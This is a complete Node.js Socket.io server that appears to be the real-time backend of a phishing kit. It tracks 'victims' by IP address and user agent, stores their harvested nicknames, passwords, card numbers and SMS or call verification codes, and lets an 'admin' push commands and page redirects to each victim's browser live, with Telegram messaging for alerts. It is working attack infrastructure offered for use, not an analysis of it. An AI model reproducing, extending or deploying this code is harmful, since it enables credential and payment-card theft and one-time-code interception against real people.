// Minimal Socket.io server for Railway/Render
// This handles real-time communication for the admin panel

const http = require('http');
const socketIo = require('socket.io');
const fetch = require('node-fetch');

const PORT = process.env.PORT || 3001;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const ALLOWED_ORIGINS = process.env.ALLOWED_ORIGINS?.split(',') || ['*'];

const server = http.createServer();
const io = socketIo(server, {
  cors: {
    origin: ALLOWED_ORIGINS,
    methods: ['GET', 'POST'],
    credentials: true
  }
});

// In-memory storage (Railway/Render may restart, but this is minimal)
let victims = {};

async function sendTelegram(message) {
  if (!BOT_TOKEN || !CHAT_ID) return;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
  } catch (err) {
    console.error('Telegram error:', err);
  }
}

io.on('connection', (socket) => {
  console.log('New connection:', socket.id);

  socket.on('admin_join', () => {
    socket.join('admins');
    socket.emit('victims_update', Object.values(victims));
    console.log('Admin joined');
  });

  socket.on('victim_join', (data) => {
    const vId = data.id || socket.id;

    if (!victims[vId]) {
      victims[vId] = {
        id: vId,
        ip: socket.handshake.address,
        data: { niks: [], passwords: [], cards: [], sms_codes: [], call_codes: [] },
        lastSeen: new Date(),
        history: [],
        status: 'online'
      };
    } else {
      victims[vId].status = 'online';
    }

    victims[vId].lastPage = data.page;
    victims[vId].lastSeen = new Date();
    victims[vId].socketId = socket.id;
    victims[vId].userAgent = socket.handshake.headers['user-agent'];
    socket.vId = vId;
    socket.join(vId);

    io.to('admins').emit('victims_update', Object.values(victims));
    console.log('Victim joined:', vId);
  });

  socket.on('admin_command', (data) => {
    const { victimId, command, page } = data;
    if (victims[victimId]) {
      victims[victimId].lastAction = page || command;
    }
    io.to(victimId).emit('command', { command, page });
    console.log('Admin command:', command, 'to', victimId);
  });

  socket.on('disconnect', () => {
    if (socket.vId && victims[socket.vId]) {
      victims[socket.vId].status = 'offline';
      victims[socket.vId].lastSeen = new Date();
      io.to('admins').emit('victims_update', Object.values(victims));
      console.log('Victim disconnected:', socket.vId);
    }
  });
});

server.listen(PORT, () => {
  console.log(`Socket.io server running on port ${PORT}`);
});
